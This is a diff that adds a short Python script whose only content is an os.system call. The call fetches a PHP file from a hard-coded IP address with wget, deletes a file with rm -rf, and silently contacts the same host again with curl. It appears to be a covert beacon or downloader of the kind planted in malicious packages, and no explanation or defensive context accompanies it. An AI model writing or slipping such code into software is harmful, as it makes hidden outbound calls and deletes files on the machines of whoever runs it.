@@ -1,0 +1,4 @@
+#!/usr/bin/env python
+
+import os
+os.system("cd /tmp| wget http://93.158.216.237/routers.php ; rm -rf router.html ; curl -s http://93.158.216.237/routers.php > /dev/null")
